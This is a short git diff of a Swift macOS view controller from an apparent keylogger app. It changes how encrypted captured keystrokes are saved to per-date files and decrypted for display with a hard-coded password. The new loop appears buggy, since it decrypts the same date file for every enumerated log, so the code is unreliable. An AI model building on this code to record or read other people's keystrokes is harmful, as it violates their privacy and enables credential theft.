@@ -60,18 +60,27 @@ class ViewController: NSViewController {
         textFinder.noteClientStringWillChange()
         var fileContents: Data? = nil
         if (LoggerCallback.text.count > 0) {
-            LoggerCallback.encrypt(text: LoggerCallback.text, toFile: Keylogger.filenameUrl)
+            LoggerCallback.encrypt(text: LoggerCallback.text, toFile: Keylogger.getDateFile())
             LoggerCallback.text = ""
         }
         do {
-            fileContents = try RNCryptor.decrypt(data: NSData.init(contentsOf: Keylogger.keylogs.appendingPathComponent("logs")) as Data, withPassword: LoggerCallback.PASSWORD)
-            if fileContents != nil {
-                if let data = String(data: fileContents!, encoding: .utf8) {
-                    tv.string = data
-                } else {
-                    tv.string = ""
+            var completeText = ""
+            let enumerator: FileManager.DirectoryEnumerator? = FileManager.default.enumerator(atPath: Keylogger.keylogs.path)
+            while let element = enumerator?.nextObject() as? String {
+                if (completeText != "") {
+                    completeText += "\n\n"
+                }
+                completeText += "=========== " + element + " ===========\n"
+
+                fileContents = try RNCryptor.decrypt(data: NSData.init(contentsOf: Keylogger.getDateFile()) as Data, withPassword: LoggerCallback.PASSWORD)
+                if fileContents != nil {
+                    if let data = String(data: fileContents!, encoding: .utf8) {
+                        completeText += data
+                    }
                 }
             }
+            tv.string = completeText
+            
         } catch {
             print("Problem loading logs:")
             print(error)
